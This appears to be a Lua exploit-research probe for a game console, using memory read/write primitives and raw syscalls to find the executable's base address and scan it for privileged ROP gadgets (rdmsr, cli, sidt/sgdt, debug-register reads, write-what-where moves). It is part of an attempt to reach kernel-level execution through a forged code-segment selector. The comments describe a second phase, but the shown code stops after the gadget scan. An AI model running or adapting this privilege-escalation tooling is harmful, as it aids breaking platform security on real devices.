-- CRASH_CLASS: HIGH
-- PROBE 724d: exact privileged-gadget byte patterns.
--
-- Context: 189a recorded CS=0x40 producing a live thread with no panic, and the
-- repository concluded the firmware replaces the selector. That conclusion was
-- never tested with a privileged instruction. If CS=0x40 is honoured the child
-- runs at CPL 0 and `mov rax, cr0` succeeds; at CPL 3 it raises #GP and the
-- kernel kills the process, which is exactly what the control below does.
--
-- Phase [A] scans eboot for `0F 20`/`0F 22` (mov to/from control register) and
-- prints file offsets, so phase [B] can reuse them after a relaunch (offsets are
-- stable across launches; only the base moves).
-- Phase [B] runs the CPL 3 control last, because it is expected to kill the
-- process: a child with CS=0x43 pointed at the same gadget.

print("=== PROBE 724d: exact privileged gadgets ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end

local fn_ud = syscall.pipe.fn_addr
local fn = to_num(fn_ud)
print("[0] pid=" .. tostring(to_num(native.fcall_with_rax(fn_ud, 20))))

local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() mk(593)(uint64(0), uint64(info)) end)
local ebase = (rd(info+0x10C) or 0)*4294967296 + (rd(info+0x108) or 0)
print(string.format("[0] eboot=0x%08X_%08X", math.floor(ebase/4294967296), ebase % 4294967296))
local EB = 0x494000

local function scan_all(pat)
    local res, chunk, off = {}, 0x1000, 0
    while off < EB do
        local n = math.min(chunk, EB-off)
        local ok, s = pcall(function() return memory.read_buffer(ebase+off, n) end)
        if not ok or type(s) ~= "string" then break end
        local p = 1
        while true do
            local q = string.find(s, pat, p, true)
            if not q then break end
            res[#res+1] = off + q - 1
            p = q + 1
        end
        off = off + n - (#pat-1)
        if n < chunk then break end
    end
    return res
end

local pats = {
  {"in al,dx;ret",        string.char(0xEC,0xC3)},
  {"mov rax,dr0;ret",     string.char(0x0F,0x21,0xC0,0xC3)},
  {"mov rax,dr7;ret",     string.char(0x0F,0x21,0xF8,0xC3)},
  {"sidt [rax];ret",      string.char(0x0F,0x01,0x08,0xC3)},
  {"sgdt [rax];ret",      string.char(0x0F,0x01,0x00,0xC3)},
  {"sidt [rsi];ret",      string.char(0x0F,0x01,0x0E,0xC3)},
  {"rdmsr;ret",           string.char(0x0F,0x32,0xC3)},
  {"cli;ret",             string.char(0xFA,0xC3)},
  {"mov [rsi],rax;ret",   string.char(0x48,0x89,0x06,0xC3)},
  {"mov rax,[rsi];ret",   string.char(0x48,0x8B,0x06,0xC3)},
}
for i=1,#pats do
    local l = scan_all(pats[i][2])
    local first = ""
    if #l > 0 then first = string.format(" first=%X", l[1]) end
    print(string.format("[A] %-22s sites=%d%s", pats[i][1], #l, first))
end
print("[A] alive=" .. tostring(to_num(native.fcall_with_rax(fn_ud, 20))))
